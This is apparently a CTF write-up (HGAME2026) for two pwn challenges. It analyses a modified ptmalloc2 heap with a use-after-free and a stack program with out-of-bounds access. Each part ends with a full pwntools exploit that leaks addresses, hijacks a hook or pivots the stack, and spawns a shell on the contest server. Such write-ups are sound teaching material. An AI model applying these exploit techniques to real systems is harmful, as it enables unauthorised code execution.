---
title: HGAME2026-pwn WriteUp
date: 2026-02-10 01:38:00
tags: 
    - pwn
    - HGAME2026
    - WriteUp
categories: Contest
---
## Heap1sEz

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/checksec.png)

canary and pie

### malloc.c

```c
#include <malloc.h>
#include <assert.h>
#include <stdio.h>
const int MALLOC_ALIGN_MASK = 2 * (sizeof(INTERNAL_SIZE_T)) -1;
const int SIZE_SZ = (sizeof(INTERNAL_SIZE_T));
void *start = NULL;
hook_t hook = NULL;
struct malloc_state main_arena;
struct malloc_par mp_ = {
  .top_size = TOP_CHUNK_SIZE
};
static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av) __attribute__((noinline));
static void malloc_init_state (mstate av) __attribute__((noinline));
static void unlink_chunk (mchunkptr p) __attribute__((noinline));
void *malloc (size_t bytes){
  INTERNAL_SIZE_T nb;
  INTERNAL_SIZE_T size;
  INTERNAL_SIZE_T remainder_size;

  mchunkptr       victim;
  mchunkptr       remainder;

  void *p;
  
  nb = (bytes + SIZE_SZ + MALLOC_ALIGN_MASK) < MINSIZE ? MINSIZE : (bytes + SIZE_SZ + MALLOC_ALIGN_MASK) & (~MALLOC_ALIGN_MASK);

  //first request
  if(main_arena.top == NULL){
    malloc_init_state(&main_arena);
    p = sysmalloc(nb, &main_arena);
    return p;
  }

  //unsorted bin
  while ((victim = ((mchunkptr)bin_at(&main_arena, 1))->bk) != bin_at(&main_arena, 1)) {
    size = chunksize(victim);
    /* split */
    if(size >= nb){
      if(size - nb >= MINSIZE){
        remainder_size = size - nb;
        remainder = victim;
        victim = chunk_at_offset(remainder, remainder_size);
        set_head(victim, nb);
        set_inuse(victim);
        set_head_size(remainder, remainder_size);
        set_foot(remainder, remainder_size);
        p = chunk2mem(victim);
        return p;
      }
      else{
        unlink_chunk(victim);
        set_inuse(victim);
        return chunk2mem(victim);
      }
    }
  }
  if(nb > chunksize(main_arena.top) - MINSIZE) TODO();
  /* split */
  else{
    victim = main_arena.top;
    size = chunksize(victim);
    remainder_size = size - nb;
    remainder = chunk_at_offset (victim, nb);
    main_arena.top = remainder;
    set_head (victim, nb | PREV_INUSE);
    set_head (remainder, remainder_size | PREV_INUSE);
    void *p = chunk2mem (victim);
    return p;
  }
  //can't reach here
  assert(0);
  return NULL;
}

void free(void *mem)
{
  mchunkptr p;                 /* chunk corresponding to mem */
  INTERNAL_SIZE_T size;        /* its size */
  mchunkptr nextchunk;         /* next contiguous chunk */
  INTERNAL_SIZE_T nextsize;    /* its size */
  int nextinuse;               /* true if nextchunk is used */
  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
  mchunkptr bck;               /* misc temp for linking */
  mchunkptr fwd;               /* misc temp for linking */
  if (__builtin_expect (hook != NULL, 0))
  {
    (*hook)(mem);
    return;
  }
  if(mem == NULL){
    return;
  }
  p = mem2chunk (mem);
  size = chunksize(p);
  nextchunk = chunk_at_offset(p, size);
  nextsize = chunksize(nextchunk);
  /* consolidate backward */
  if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))
      malloc_printerr ("corrupted size vs. prev_size while consolidating");
    unlink_chunk (p);
  }
  if (nextchunk != main_arena.top) {
    /* get and clear inuse bit */
    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
  
      /* consolidate forward */
      if (!nextinuse) {
	      unlink_chunk (nextchunk);                                     
	      size += nextsize;
      } else
	      clear_inuse_bit_at_offset(nextchunk, 0);
      bck = bin_at(&main_arena, 1);
      fwd = bck->fd;
      //if (__glibc_unlikely (fwd->bk != bck))
	//malloc_printerr ("free(): corrupted unsorted chunks");
      p->fd = fwd;
      p->bk = bck;
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);
      //check_free_chunk(av, p);
    }
    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */
    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      main_arena.top = p;
      //check_chunk(av, p);
    }
}

void *calloc(size_t count, size_t size) { TODO(); return NULL;}
void *realloc(void *ptr, size_t size) { TODO(); return NULL;}
void *reallocf(void *ptr, size_t size) { TODO(); return NULL;}
void *valloc(size_t size) { TODO(); return NULL;}
void *aligned_alloc(size_t alignment, size_t size) { TODO(); return NULL;}
static void
unlink_chunk (mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;                                                 
  mchunkptr bk = p->bk;

  //if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    //malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
}
static void *
sysmalloc (INTERNAL_SIZE_T nb, mstate av){
  INTERNAL_SIZE_T size;
  mchunkptr p;

  size = nb + mp_.top_size;
  if(av->top == NULL){
    start = sbrk(0);
    p = sbrk(size);
    main_arena.top = chunk_at_offset(p, nb);
    set_head(p, nb | PREV_INUSE);
    set_foot(p, nb);
    set_head(main_arena.top, mp_.top_size | PREV_INUSE);
    return chunk2mem(p);
  }
  else{
    TODO();
  }
}
static void
malloc_init_state (mstate av)
{
  int i;
  mbinptr bin;

  /* Establish circular links for normal bins */
  for (i = 1; i < 2; ++i)
    {
      bin = bin_at (av, i);
      bin->fd = bin->bk = bin;
    }
}
```

魔改了 ptmalloc2 ，只留下 unsortedbin 功能，而且还有 size < nb 会卡死的问题

free 有 hook 可以劫持

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/main.png)

菜单题

#### menu

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/menu.png)

#### add

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/add.png)

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/delete.png)

free 后没清空， 有 UAF

#### edit

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/edit.png)

UAF ，同时可用于实现 AAW

#### show

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/show.png)

可泄露 unsortedbin 的哨兵地址，同时可用于实现 AAR

#### gift

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/gift.png)

劫持 hook

#### bss

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/Heap1sEz/bss.png)

### 攻击思路

注意到 usortedbin 的哨兵存在于 bss 段，考虑 free 掉一个 chunk 进入 usortedbin 去 leak pie ，注意避免该 chunk 被并入 top_chunk

然后通过在 bss 段上伪造包含 notes 区域的 fake chunk 并将 fake chunk 地址写入 free chunk 再 malloc 以获取 AAW 和 AAR 的能力

最后 leak libc 并劫持 hook 为 system ，再往一个 chunk 内写入 '/bin/sh\x00' 并 free 掉即可提权

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./vuln_patched')
else:
	io = remote('cloud-middle.hgame.vidar.club', 31275)

libc = ELF('./libc.so.6')

ssiz = 0x30
prosiz = 0x100

def madd(idx, size):
	io.sendlineafter(b'>\n', b'1')
	io.sendlineafter(b'Index: ', str(idx).encode())
	io.sendlineafter(b'Size: ', str(size).encode())

def mdelete(idx):
	io.sendlineafter(b'>\n', b'2')
	io.sendlineafter(b'Index: ', str(idx).encode())

def medit(idx, cont):
	io.sendlineafter(b'>\n', b'3')
	io.sendlineafter(b'Index: ', str(idx).encode())
	io.sendafter(b'Content: ', cont)

def mshow(idx):
	io.sendlineafter(b'>\n', b'4')
	io.sendlineafter(b'Index: ', str(idx).encode())

def mexit():
	io.sendlineafter(b'>\n', b'5')

def mgift(addr):
	io.sendlineafter(b'>\n', b'6')
	io.sendlineafter(b'hook\n', hex(addr).encode())

def AAW(addr, cont):
	medit(10, (p64(prosiz) * 4).ljust(0x30, b'\x00') + p64(addr))
	medit(0, cont)

def AAR(addr):
	medit(10, (p64(prosiz) * 4).ljust(0x30, b'\x00') + p64(addr))
	mshow(0)

def attack():
	madd(0, ssiz)
	madd(12, ssiz)
	mdelete(0)
	mshow(0)
	completed_0_addr = u64(io.recv(6).ljust(8, b'\x00'))
	pie_leak = completed_0_addr - 0x808
	log.info(f'pie_leak = {hex(pie_leak)}')

	saddr = pie_leak + 0x840
	medit(0, p64(saddr))
	madd(8, ssiz)
	medit(0, p64(completed_0_addr) + p64(saddr))
	madd(2, ssiz)
	madd(10, ssiz - 0x8)
	medit(10, p64(prosiz) * 4)

	AAR(pie_leak + 0x7a0)
	__libc_start_main_addr = u64(io.recv(6).ljust(8, b'\x00'))
	libc_base_addr = __libc_start_main_addr - libc.symbols['__libc_start_main']
	log.info(f'libc_base_addr = {hex(libc_base_addr)}')
	
	system_addr = libc_base_addr + libc.symbols['system']
	mgift(system_addr)
	AAW(pie_leak + 0xa00, b'/bin/sh\x00')
	mdelete(0)
	
	io.interactive()

attack()
```

## adrift

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/checksec.png)

Full RELRO 和 PIE

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/main.png)

case 1 处发现可以使 i = 201 ，从而发生数组越界写向 dis 写入数据，同时有栈溢出

写入后清空栈上内容

case 3 可以填满 dis ，用于辅助 case 1 的越界写

#### init_canary

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/init_canary.png)

手动 canary ，放在栈上

#### delete

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/delete.png)

#### show
 
![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/show.png)

在 short int 下 -(-32768) = -32768 ，可以造成数组越界读取，且恰好读取到 canary ，同时可 leak stack

并注意到整个程序只有这里有读取，因此想要 leak pie 或 leak libc 必须要把数据写入 dis 中

#### bss

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/bss1.png)

![这是什么鸭](https://pic.ratherhard.com/post/contest/HGAME-2026/adrift/bss2.png)

### 攻击思路

首先 leak canary ，然后通过把栈上数据 copy 到 dis 上去 leak pie

然后栈迁移到 bss 上去 leak stderr 从而拿到 libc 基址，注意此处不能 leak stdin ，因为向 dis 写入完成后原数据区域会被清空，导致后面的 scanf 处崩溃；也不能 leak got ，因为 Full RELRO ，且 case 1 有写入栈的操作

最后 ret2libc 即可

libc 版本我用 libcdb 没试出来，最后发现跟上一题一样

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./vuln_patched')
else:
	io = remote('cloud-middle.hgame.vidar.club', 31603)

def moverflow(cont, dirt):
	io.sendlineafter(b'choose> ', b'0')
	io.sendafter(b'way> ', cont)
	io.sendlineafter(b'distance> ', str(dirt).encode())

def mdelete(idx):
	io.sendlineafter(b'choose> ', b'1')
	io.sendlineafter(b'index> ', str(idx).encode())

def mshow(idx):
	io.sendlineafter(b'choose> ', b'2')
	io.sendlineafter(b'index> ', str(idx).encode())

def mdis(idx):
	io.sendlineafter(b'choose> ', b'3')
	io.sendlineafter(b'index> ', str(idx).encode())
	io.sendlineafter(b'distance> ', b'1')

def mexit():
	io.sendlineafter(b'choose> ', b'4')

def canary_leak():
	mshow(-32768)
	io.recvuntil(b': ')
	canary = int(io.recvuntil(b'\n', drop = True).decode('utf-8'), 10)
	log.info(f'canary = {hex(canary)}')
	return canary


def mleak(idx, name, offset):
	mshow(idx)
	io.recvuntil(b': ')
	leak = int(io.recvuntil(b'\n', drop = True).decode('utf-8'), 10)
	log.info(f'{name} leak = {hex(leak - offset)}')
	libcdict_add(name, leak - offset)
	return leak - offset

def attack():
	for i in range(201):
		mdis(i)

	canary = canary_leak()

	moverflow(p64(0), 1)
	mshow(114)
	io.recvuntil(b': ')
	pie = int(io.recvuntil(b'\n', drop = True).decode('utf-8'), 10) // 0x10000 - 0x040
	log.info(f'pie = {hex(pie)}')

	for i in range(201):
		mdis(i)

	midx = 100
	pov_addr = pie + 0x4080 + 0x518 * midx
	mdelete(midx)
	bss_addr = pie + 0x4040
	bss_leaker = bss_addr + 0x3fa
	again_addr = pie + 0x14F3
	payload = p64(bss_leaker) + p64(again_addr)
	moverflow(payload, 1)
	mdelete(0)
	leave_addr = pie + 0x1721
	payload = b'A' * (0x3fa - 0x10) + p64(canary) + b'A' * 8 + p64(pov_addr) + p64(leave_addr)
	moverflow(payload, 1)
	mdelete(1)
	mexit()
	io.sendlineafter(b'distance> ', b'1')

	midx = 150
	pov_addr = pie + 0x4080 + 0x518 * midx
	mdelete(midx)
	pov_leaker = pie + 0x4080 + 0x510 + 0x3fa
	again_addr = pie + 0x14F3
	payload = p64(pov_leaker) + p64(again_addr)
	moverflow(payload, 1)
	mdelete(2)
	payload = b'\x00' * 0x3fa + p64(pov_addr) + p64(leave_addr)
	moverflow(payload, 1)
	mexit()
	io.sendlineafter(b'distance> ', b'1')
	stderr_leak = mleak(0, '_IO_2_1_stderr_', 0)

	for i in range(201):
		mdis(i)

	libc = ELF('./libc.so.6')
	libc_base = stderr_leak - libc.symbols['_IO_2_1_stderr_']
	log.info(f'libc_base = {hex(libc_base)}')

	for i in range(10):
		mdis(i)

	midx = 10
	pov_addr = pie + 0x4080 + 0x518 * midx
	rbp_addr = pie + 0x4080 + 0x518 * midx * 2
	pop_rdi_ret = libc_base + 0x2a3e5
	system_addr = libc_base + libc.symbols['system']
	bin_sh = libc_base + next(libc.search(b'/bin/sh'))
	mdelete(midx)
	ret_addr = pie + 0x1722
	payload = p64(rbp_addr) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)
	moverflow(payload, 1)
	mdelete(0)
	payload = b'\x00' * 0x3fa + p64(pov_addr) + p64(leave_addr)
	moverflow(payload, 1)
	mexit()
	io.interactive()

attack()
```